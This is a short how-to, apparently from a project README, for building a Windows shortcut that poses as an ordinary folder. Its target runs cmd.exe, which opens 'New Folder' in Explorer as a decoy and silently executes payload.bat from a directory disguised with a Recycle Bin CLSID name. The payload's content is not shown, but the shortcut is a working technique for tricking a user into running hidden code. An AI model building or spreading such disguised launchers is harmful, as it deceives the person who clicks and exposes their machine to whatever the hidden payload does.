##How to create the shortcut (.lnk)
1. Create a shortcut to any file in the root folder
2. Go to properties and change the `Target` to

<br>

    C:\Windows\System32\cmd.exe /c "explorer "%cd%\New Folder"&if exist ".Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\" (".Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\payload.bat") else (if exist ".Recycle Bin\" (".Recycle Bin\payload.bat"))"

**This basically opens the `New Folder` in explorer and then checks to see if the `.Recycle Bin` folder exists and relatively executes it.**

Make sure that the `Open in` box is left blank